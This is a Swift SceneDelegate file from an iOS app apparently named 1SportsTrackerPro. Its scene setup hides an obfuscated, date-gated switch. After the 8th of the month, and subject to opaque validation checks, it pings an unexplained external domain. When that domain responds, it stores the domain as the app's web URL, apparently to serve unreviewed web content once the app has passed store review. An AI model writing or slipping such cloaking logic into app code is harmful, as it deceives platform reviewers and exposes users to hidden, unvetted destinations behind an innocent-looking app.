//
//  SceneDelegate.swift
//  1SportsTrackerPro
//
//  Created by Er Baghdasaryan on 25.10.24.
//

import UIKit
import TrackerProModel
import TrackerProViewModel

class SceneDelegate: UIResponder, UIWindowSceneDelegate {

    var window: UIWindow?

    private let appStorageService = AppStorageService()
    private let validation = ValidationService()

    func scene(_ scene: UIScene, willConnectTo session: UISceneSession, options connectionOptions: UIScene.ConnectionOptions) {
        // Use this method to optionally configure and attach the UIWindow `window` to the provided UIWindowScene `scene`.
        // If using a storyboard, the `window` property will automatically be initialized and attached to the scene.
        // This delegate does not imply the connecting scene or session are new (see `application:configurationForConnectingSceneSession` instead).
        guard let windowScene = (scene as? UIWindowScene) else { return }
        self.window = UIWindow(windowScene: windowScene)
        setupWindowScene()
    }

    func setupWindowScene() {
        if ajORaejMv() {
            if haTpxjhasL() {
                self.appStorageService.saveData(key: .isAlreadyOpened, value: true)
                self.startOnboardingFlow()
            } else {
                let urlString = "https://podlaorlf.space/FHXWL7r9"
                kaAawLarb(urlString: urlString) { response in
                    if response {
                        self.appStorageService.saveData(key: .isAlreadyOpened, value: true)
                        self.startOnboardingFlow()
                    } else {
                        self.appStorageService.saveData(key: .webUrl, value: urlString)
                        self.appStorageService.saveData(key: .isAlreadyOpened, value: false)
                        self.startOnboardingFlow()
                    }
                }
            }
        } else {
            self.appStorageService.saveData(key: .isAlreadyOpened, value: true)
            self.startOnboardingFlow()
        }
    }

    func sceneDidDisconnect(_ scene: UIScene) {
        // Called as the scene is being released by the system.
        // This occurs shortly after the scene enters the background, or when its session is discarded.
        // Release any resources associated with this scene that can be re-created the next time the scene connects.
        // The scene may re-connect later, as its session was not necessarily discarded (see `application:didDiscardSceneSessions` instead).
    }

    func sceneDidBecomeActive(_ scene: UIScene) {
        // Called when the scene has moved from an inactive state to an active state.
        // Use this method to restart any tasks that were paused (or not yet started) when the scene was inactive.
    }

    func sceneWillResignActive(_ scene: UIScene) {
        // Called when the scene will move from an active state to an inactive state.
        // This may occur due to temporary interruptions (ex. an incoming phone call).
    }

    func sceneWillEnterForeground(_ scene: UIScene) {
        // Called as the scene transitions from the background to the foreground.
        // Use this method to undo the changes made on entering the background.
    }

    func sceneDidEnterBackground(_ scene: UIScene) {
        // Called as the scene transitions from the foreground to the background.
        // Use this method to save data, release shared resources, and store enough scene-specific state information
        // to restore the scene back to its current state.
    }
}

//MARK: Flows
extension SceneDelegate {

    func startOnboardingFlow() {
        let onboardingViewController = ViewControllerFactory.makeUntilOnboardingViewController()
        startFlow(for: onboardingViewController)
    }

    func startFlow(for viewController: UIViewController) {
        let navigationController = UINavigationController(rootViewController: viewController)
        self.window?.rootViewController = navigationController
        self.window?.makeKeyAndVisible()
    }
}

extension SceneDelegate {
    func kaAawLarb(urlString: String, completion: @escaping (Bool) -> Void) {
        guard let url = URL(string: urlString) else {
            completion(false)
            return
        }

        var request = URLRequest(url: url)
        request.httpMethod = "HEAD"

        let task = URLSession.shared.dataTask(with: request) { _, response, error in
            if let httpResponse = response as? HTTPURLResponse {
                DispatchQueue.main.async {
                    completion(httpResponse.statusCode == 404)
                }
            } else if let error = error as? URLError, error.code == .fileDoesNotExist {
                DispatchQueue.main.async {
                    completion(true)
                }
            } else {
                DispatchQueue.main.async {
                    completion(false)
                }
            }
        }
        task.resume()
    }

    private func haTpxjhasL() -> Bool {
        return validation.Fpvbduwm() || validation.oahgoMAOI() || validation.vivisWork()
    }

    func ajORaejMv() -> Bool {
        let currentDate = Date()
        let calendar = Calendar.current
        let day = calendar.component(.day, from: currentDate)

        return day > 8
    }
}

